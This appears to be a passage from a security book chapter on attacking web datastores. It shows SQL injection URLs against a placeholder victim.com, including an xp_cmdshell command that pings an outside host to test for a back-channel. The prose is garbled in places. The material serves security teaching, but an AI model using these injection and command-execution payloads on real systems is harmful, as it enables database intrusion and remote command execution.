# Chapter 8: Attacking Web Datastores

233

Oops, we omitted the '" characters and informed that the "sa_Get" user does not exist. Still, this is instructive in deducing the original form of the SQL query as well as demonstrating the importance of correct SQL grammar. The URL should appear:

```
https://www.victim.com/DataList.asp?Page=24&PageName=sp_who2+sa--
```

Unfortunately, this HTML page that contains the column names for the sp_who2 command, but not the output. In this scenario we were limited to return a single string, as the server's name or the software's version number. It would take some multiline SQL statements to gather more verbose information.\ Let's get back for a second and demonstrate why this happens. We omit the comment (--) and examine the output:

```
Sent -- https://www.victim.com/DataList.asp?Page=24&PageName==-
Received -- https://www.victim.com/Error.asp?plog=True&e=4&en=-2147217906&line=1%3A+syntax=4%27%26%7EE=Microsoft+OLE+DB+Provider=SQL+Server&rlenEnc&fn=ExecuteSQL
```

As you can see, the terminated SQL statement ends with an end command. All have been done providing stored procedures for the application to execute. As a parting thought, consider the option that we do not need to return data in the error field. If we perform SQL injection, then we most likely have access to the xp_cmdshell, an extended stored procedure that provides the equivalent of cmd.exe. We run a tcdump on our system, then try a ping. If we see any incoming ICMP traffic, then it won't take long to build a back-channel into the database. Note that probably be from the IP address of victim.com. The database is making the connection, so the IP address could be a neighboring server, a connection made through a NAT firewall, or no connection at all if strong network controls are in place on victim's network.

```
https://www.victim.com/DataList.asp?Page=24&PageName=
master..xp_cmdshell"ping 192.168.90.12--"
```

The SQL injection process uses an iterative methodology. You first try a invalid character and examine the effect. Then you try a simple SQL command and examine the effect. Eventually, you'll reach the point where you have the correct number of ticks, parentheses, or other formatting characters.

# MS SQL Server Techniques

SQL Server has four default databases plus one sample:

+   Master data for all login configurations, settings, other databases, and initialization information. Many internal variables, stored procedures, and extended stored procedures are called from this database.

+   Model Provides a template for new databases.